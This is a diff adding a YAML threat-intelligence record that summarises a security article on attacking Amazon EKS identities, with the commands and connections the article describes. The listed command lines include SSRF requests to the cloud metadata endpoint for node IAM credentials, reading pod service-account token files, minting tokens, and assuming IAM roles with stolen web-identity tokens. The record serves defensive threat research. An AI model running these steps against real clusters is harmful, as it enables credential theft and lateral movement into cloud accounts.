@@ -1,0 +1,71 @@
+title: IntroductionAmazon Elastic Kubernetes Service (EKS) is a popular way to run
+  managed Kubernetes clusters in the cloud.
+description: An attacker can exploit SSRF vulnerabilities to compromise worker node
+  credentials and create service account tokens for any pod running on the node, allowing
+  them to pivot laterally from a compromised workload to the cloud environment.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes: []
+  command_lines:
+  - aws eks update-kubeconfig --name $EKS_CLUSTER_NAME
+  - aws --region eu-west-1 eks get-token --cluster-name mkat-cluster
+  - kubectl config view --minify --output jsonpath="{.clusters[*].cluster.server}"
+  - kubectl config view --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}'
+    | base64 -d > ca.crt
+  - curl --cacert ca.crt $API_SERVER/ -H "Authorization: Bearer $TOKEN"
+  - kubectl-whoami --server $API_SERVER --certificate-authority ca.crt --token $TOKEN
+    --all
+  - kubectl get -n microservices pod/inventory-service -o yaml | grep arn
+  - aws sts assume-role-with-web-identity --web-identity-token file://token --role-arn
+    arn:aws:iam::012345678901:role/inventory-service-role --role-session-name hacked
+  - kubectl run vulnerable-application --image ghcr.io/datadog/vulnerable-java-application
+  - kubectl port-forward pod/vulnerable-application 8000
+  - aws eks get-token --cluster-name $EKS_CLUSTER_NAME | jq -r .status.token
+  - kubectl auth can-i --list --token=$(cat token)
+  - kubectl auth can-i --list --token=$(cattoken)
+  - aws sts assume-role-with-web-identity --web-identity-token $JWT --role-arn arn:aws:iam::012345678901:role/webserver-role
+    --role-session-name christophe
+  - kubectl exec -it webserver -- aws sts get-caller-identity
+  - kubectl exec -it webserver -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
+  - kubectl create token inventory-service-sa -n microservices --audience=sts.amazonaws.com
+    --bound-object-kind=Pod --bound-object-name=inventory-service --bound-object-uid=67498d10-add3-4d7c-9b9e-65dab5640872
+    > token
+  - eksctl create iamserviceaccount --cluster "${CLUSTER_NAME}" --region "${AWS_REGION}"
+    name="${SERVICE_ACCOUNT_NAME}" namespace="${SERVICE_ACCOUNT_NAMESPACE}" --role-name="${IAM_ROLE_NAME}"
+    role-only attach-policy-arn="arn:aws:iam::aws:policy/AdministratorAccess" --approve
+  - mkat eks find-role-relationships
+  - brew tap datadog/mkat https://github.com/datadog/managed-kubernetes-auditing-toolkit
+  - brew install datadog/mkat/managed-kubernetes-auditing-toolkit
+  - mkat version
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - vulnerable-application -> http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  - vulnerable-application -> http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-cluster-nodegroup-ng-NodeInstanceRole
+  - http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-cluster-nodegroup-ng-NodeInstanceRole
+    -> 169.254.169.254:80
+  - kubectl exec -it webserver -- curl hxxps://oidc.eks.eu-west-1.amazonaws.com/id/AF26D840E519D2F3902468224667D259/.well-known/openid-configuration
+  - kubectl exec -it webserver -- curl hxxps://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+      -s
+  - kubectl exec -it webserver -- curl -H "X-aws-ec2-metadata-token: STOKEN -v" hxxps://169.254.169.254/latest/meta-data/
+  file_activity:
+  - /var/run/secrets/eks.amazonaws.com/serviceaccount/token
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - oidc.eks.eu-west-1.amazonaws.com
+  - oidc.eks.us-east-1.amazonaws.com
+  urls:
+  - hxxps://securitylabs.dd-static.net/img/amazon-eks-attacking-securing-cloud-identities/mkat-imds.png?auto=format&w=896&dpr=1.75
+  - hxxps://securitylabs.dd-static.net/img/amazon-eks-attacking-securing-cloud-identities/attack-paths.png?auto=format&w=896&dpr=1.75
+authors: []
+reference: https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities
+date_of_publication: February 09, 2024
+file_creation_date: May 01, 2026
